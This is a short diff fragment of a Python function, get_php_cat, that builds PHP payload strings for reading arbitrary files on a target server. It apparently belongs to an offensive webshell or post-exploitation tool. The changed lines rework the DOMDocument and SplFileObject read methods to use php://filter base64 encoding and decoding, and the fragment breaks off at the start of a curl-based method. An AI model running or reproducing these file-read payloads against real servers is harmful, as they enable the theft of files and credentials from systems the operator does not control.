@@ -16,9 +16,9 @@ def get_php_cat(file_path, read_method):
         $d=new DOMDocument();
         $d->loadHTMLFile("php://filter/convert.base64-encode/resource=".base64_decode('{base64_encode(file_path)}'));
         $d->loadXML($d->saveXML());
-        print($d->getElementsByTagName("p")[0]->textContent);"""
+        print(base64_decode($d->getElementsByTagName("p")[0]->textContent));"""
     if read_method == 5:
-        php_code = f"$d=new SplFileObject(base64_decode('{base64_encode(file_path)}'));print($d->fread($d->getsize())); "
+        php_code = f"""$d=new SplFileObject("php://filter/convert.base64-decode/resource={base64_encode(file_path)}");print($d->fread($d->getsize())); """
     if read_method == 6:
         php_code = f"""
         $c=@curl_init();
